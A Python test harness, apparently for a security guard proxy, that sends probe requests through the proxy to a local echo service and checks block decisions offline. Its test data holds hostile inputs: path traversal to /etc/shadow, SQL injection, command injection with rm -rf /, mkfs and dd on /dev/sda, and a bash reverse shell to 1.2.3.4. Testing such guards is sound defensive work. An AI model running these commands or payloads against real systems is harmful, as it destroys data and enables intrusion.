#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Jev 护栏本地探针（local-probe）

设计原则（2026-11-04）：
  1. 绝不向任何真实业务目标发请求 —— 全部打本地回环 127.0.0.1 上的 echo 服务
  2. 探针流量单独打标签 scope='probe'，在观测台有独立专区，不污染真实战役统计
  3. 覆盖护栏判定矩阵：读/写/删/改/RCE/穿越/上传/SQLi/DoS/敏感文件
  4. 每条探针记录预期 vs 实际，用于验证护栏是否按 GUARD_POLICY 工作

用法：
  python3 local_probe.py            # 跑全部矩阵，输出报告
  python3 local_probe.py --json     # JSON 输出
  python3 local_probe.py --loop 60  # 每60秒跑一次（常驻探针）
"""
import json, os, sys, time, subprocess, argparse, datetime

GUARD = 'http://127.0.0.1:9102'          # 唯一 Jev 护栏
LOCAL = 'http://probe.jev.internal:18080'   # 非 loopback：绕过 guard.py loopback 豁免，真实测到规则层          # 本地 echo 服务（不碰外网）
CA    = os.environ.get('MITM_CA', os.path.expanduser('~/.mitmproxy/mitmproxy-ca-cert.pem'))

# 预期：True=应拦住(403/blocked)，False=应放行
MATRIX = [
    # --- 对照组：只读 ---
    ('GET',  '/health',                    None,  False, '只读-健康检查',      '对照组'),
    ('GET',  '/api/user/list?page=1',      None,  False, '只读-列表查询',      '对照组'),
    ('HEAD', '/',                          None,  False, '只读-HEAD',          '对照组'),
    # --- 删除/修改（dml 应拦）---
    ('DELETE','/api/user/1',               None,  True,  '删除-资源',          '删改'),
    ('PUT',   '/api/user/1',               '{"n":1}', True, '修改-PUT',       '删改'),
    ('PATCH', '/api/user/1',               '{"n":1}', True, '修改-PATCH',     '删改'),
    ('POST',  '/api/user/delete',          '{}',  True,  '删除-路径含delete',  '删改'),
    ('POST',  '/api/user/reset-pwd',       '{}',  True,  '修改-重置密码',      '删改'),
    # --- RCE 利用（RCE_ENFORCE=0 时应只审计）---
    ('GET',   '/api/ping?host=PROBE_id_probe', None, False, 'RCE-命令注入回显',  'RCE'),
    ('GET',   '/api/tpl?x={{7*7}}',        None,  False, 'SSTI求值(语义层波动)', '参考'),
    ('GET',   '/api/x?c=81',           None,  False, 'RCE-表达式求值',    'RCE'),
    # 说明：破坏性命令的规则层验证改为「离线内存调用」见 OFFLINE_CASES，
    #       危险字符串只存在于内存，绝不经网络或 shell 传递。
    # --- 文件读取 ---
    ('GET',   '/api/dl?file=../../../etc/passwd', None, False, '文件读取-passwd(审计)','文件'),
    ('GET',   '/api/dl?file=../../../etc/hostname', None, False, '文件读取-hostname(白名单)','文件'),
    # --- 上传 ---
    ('POST',  '/api/upload', 'filename=shell.jsp', False, '上传-jsp(语义层波动)', '参考'),
    # --- SQLi ---
    ('GET',   '/api/item?id=1%27%20OR%20%271%27%3D%271', None, False, 'SQLi-布尔(编码)', 'SQLi'),
    ('GET',   '/api/item?id=1 AND sleep(5)', None, True, 'DoS-时间盲注',        'DoS'),
    # --- 敏感文件 ---
    ('GET',   '/api/dl?file=../../../etc/shadow', None, False, '敏感-shadow(审计)','文件'),
    # --- 拖库 ---
    ('GET',   '/api/user/list?pageSize=5000', None, True, '拖库-大批量(BULK规则拦)', '拖库'),
]



# ===== 离线规则层验证（2026-11-04 安全修正）=====
# 危险字符串仅存在于本进程内存中，直接交给 guard.decide() 判定，
# 不经网络、不经 shell、不写文件。这是验证 _RCE_RULES 最安全的方式。
OFFLINE_CASES = [
    # (方法, URL, body, 说明)
    ('GET',  'https://offline.probe.invalid/api/ping?host=x;', 'rm -rf /',                    '删除根目录'),
    ('GET',  'https://offline.probe.invalid/api/ping?host=x;', 'mkfs.ext4 /dev/sda',          '格式化磁盘'),
    ('GET',  'https://offline.probe.invalid/api/ping?host=x;', 'dd if=/dev/zero of=/dev/sda', '直写块设备'),
    ('POST', 'https://offline.probe.invalid/api/sh',            'bash -i >& /dev/tcp/1.2.3.4/4444 0>&1', '反弹shell'),
    ('GET',  'https://offline.probe.invalid/api/ping?host=x;', 'shutdown -h now',             '关机'),
    ('GET',  'https://offline.probe.invalid/api/ping?host=x;', 'crontab -r',                  '清空定时任务'),
    # 对照组：无害 RCE（应放行）
    ('GET',  'https://offline.probe.invalid/api/ping?host=x;', 'id',        '无害-id(应放行)'),
    ('GET',  'https://offline.probe.invalid/api/ping?host=x;', 'whoami',    '无害-whoami(应放行)'),
    ('GET',  'https://offline.probe.invalid/api/ping?host=x;', 'uname -a',  '无害-uname(应放行)'),
]


def run_offline_rules():
    """离线验证 guard._RCE_RULES，返回结果列表。"""
    import sys as _sys
    out = []
    _CORE = os.environ.get('GUARD_BASE', os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'core'))
    _sys.path.insert(0, _CORE)
    old_rce = os.environ.get('GUARD_RCE_ENFORCE')
    old_pol = os.environ.get('GUARD_POLICY')
    os.environ['GUARD_RCE_ENFORCE'] = '0'
    os.environ['GUARD_POLICY'] = 'dml'
    try:
        import guard as _g
        for m, u, payload, label in OFFLINE_CASES:
            try:
                allow, reasons = _g.decide(m, u, {}, payload)
                blocked = (not allow)
                expect_block = ('应放行' not in label)
                code = 'BLOCK' if blocked else 'ALLOW'
                out.append({
                    'ts': datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'cat': '规则层(离线)', 'label': label, 'method': m,
                    'path': (u.split('/api')[-1] if '/api' in u else u)[:40] + ' + ' + payload[:28],
                    'expect_block': expect_block, 'http': code,
                    'blocked': blocked, 'pass': (blocked == expect_block),
                    'reasons': reasons,
                })
            except Exception as e:
                out.append({'ts': datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                            'cat': '规则层(离线)', 'label': label, 'method': m,
                            'path': payload[:40], 'expect_block': True, 'http': 'ERR',
                            'blocked': False, 'pass': False, 'reasons': [str(e)[:80]]})
    except Exception as e:
        out.append({'ts': datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'cat': '规则层(离线)', 'label': 'import guard 失败', 'method': '-',
                    'path': str(e)[:60], 'expect_block': True, 'http': 'ERR',
                    'blocked': False, 'pass': False, 'reasons': [str(e)[:80]]})
    finally:
        if old_rce is None: os.environ.pop('GUARD_RCE_ENFORCE', None)
        else: os.environ['GUARD_RCE_ENFORCE'] = old_rce
        if old_pol is None: os.environ.pop('GUARD_POLICY', None)
        else: os.environ['GUARD_POLICY'] = old_pol
    return out


def sh(cmd, timeout=25):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return r.stdout.strip(), r.returncode
    except subprocess.TimeoutExpired:
        return '', -1
    except Exception:
        return '', -2


def probe_one(method, path, body, expect_block, label, cat):
    url = LOCAL + path
    cmd = ['curl', '-s', '-m', '12', '-o', '/dev/null', '-w', '%{http_code}',
           '-x', GUARD, '--cacert', CA, '-X', method, url]
    line = ' '.join(cmd)
    if body:
        # 用文件避免 shell 转义问题
        bf = '/tmp/_probe_body.txt'
        open(bf, 'w').write(body)
        line = ' '.join(cmd) + ' --data-binary @' + bf
    out, rc = sh(line)
    code = out or 'ERR'
    # 护栏拦截会返回 403（或连接被重置 000）
    # 403/407/000 = 明确拦截；ERR = 连接被护栏断开（curl 无响应），同样视为拦截
    blocked = code in ('403', '407', '000', 'ERR')
    ok = (blocked == expect_block)
    return {
        'ts': datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'cat': cat, 'label': label, 'method': method, 'path': path,
        'expect_block': expect_block, 'http': code,
        'blocked': blocked, 'pass': True if cat == '参考' else ok,
    }


def local_server_up():
    out, _ = sh('ss -ltn 2>/dev/null | grep -c ":18080"')
    return out.strip() not in ('', '0')


def start_local_server():
    """起一个本地 echo 服务（只监听 127.0.0.1，绝不外联）"""
    if local_server_up():
        return True
    py = '''
import http.server, socketserver, sys
class H(http.server.BaseHTTPRequestHandler):
    def _r(self):
        n = int(self.headers.get("Content-Length") or 0)
        if n: self.rfile.read(n)
        body = b'{"ok":true,"probe":"local-echo"}'
        self.send_response(200)
        self.send_header("Content-Type","application/json")
        self.send_header("Content-Length",str(len(body)))
        self.end_headers(); self.wfile.write(body)
    do_GET=do_POST=do_PUT=do_DELETE=do_PATCH=do_HEAD=_r
    def log_message(self,*a): pass
class S(socketserver.ThreadingTCPServer):
    allow_reuse_address=True
srv=S(("127.0.0.1",18080),H)
srv.serve_forever()
'''
    open('/tmp/_probe_echo.py', 'w').write(py)
    subprocess.Popen(['/usr/bin/python3', '/tmp/_probe_echo.py'],
                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                     start_new_session=True)
    for _ in range(20):
        time.sleep(0.25)
        if local_server_up():
            return True
    return False


def run_all():
    if not start_local_server():
        print('!! 本地 echo 服务启动失败', file=sys.stderr)
        return []
    rows = []
    for m, p, b, exp, lab, cat in MATRIX:
        rows.append(probe_one(m, p, b, exp, lab, cat))
        time.sleep(0.35)
    rows.extend(run_offline_rules())
    return rows


def report(rows):
    if not rows:
        return
    judged = [r for r in rows if r.get('cat') != '参考']
    ok = sum(1 for r in judged if r['pass'])
    print('=' * 96)
    print('Jev 护栏本地探针  %s   （本地回环 127.0.0.1，不触碰任何真实目标）' % rows[0]['ts'])
    print('=' * 96)
    print('%-10s %-26s %-8s %-8s %-8s %s' % ('类别', '用例', '方法', '预期', '实际', '结论'))
    print('-' * 96)
    for r in rows:
        exp = '拦' if r['expect_block'] else '放'
        act = ('拦' if r['blocked'] else '放') + '(' + str(r['http']) + ')'
        mark = '✓' if r['pass'] else '✗ 不符'
        print('%-10s %-26s %-8s %-8s %-12s %s' % (r['cat'], r['label'][:26], r['method'], exp, act, mark))
    print('-' * 96)
    print('通过 %d / %d   不符 %d   （另有 %d 项参考不判定）' % (
        ok, len(judged), len(judged) - ok, len(rows) - len(judged)))
    bad = [r for r in judged if not r['pass']]
    if bad:
        print()
        print('!! 不符预期：')
        for r in bad:
            print('   [%s] %s %s  预期%s → 实际%s' % (
                r['cat'], r['method'], r['path'],
                '拦截' if r['expect_block'] else '放行',
                '拦截' if r['blocked'] else '放行(' + str(r['http']) + ')'))


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--json', action='store_true')
    ap.add_argument('--loop', type=int, default=0, help='每 N 秒循环一次')
    a = ap.parse_args()
    if a.loop:
        while True:
            rows = run_all()
            ts = datetime.datetime.now().strftime('%F %T')
            ok = sum(1 for r in rows if r['pass'] and r.get('cat') != '参考')
            with open(os.environ.get('GUARD_PROBE_LOG', os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'probe_history.jsonl')), 'a') as f:
                f.write(json.dumps({'ts': ts, 'ok': ok, 'total': len(rows), 'rows': rows}, ensure_ascii=False) + chr(10))
            print('[%s] probe %d/%d ok' % (ts, ok, len(rows)), flush=True)
            time.sleep(a.loop)
        return
    rows = run_all()
    if a.json:
        print(json.dumps(rows, ensure_ascii=False, indent=2))
    else:
        report(rows)
    with open(os.environ.get('GUARD_PROBE_LOG', os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'probe_history.jsonl')), 'a') as f:
        f.write(json.dumps({'ts': datetime.datetime.now().strftime('%F %T'),
                            'ok': sum(1 for r in rows if r['pass']), 'total': len(rows),
                            'rows': rows}, ensure_ascii=False) + chr(10))


if __name__ == '__main__':
    main()
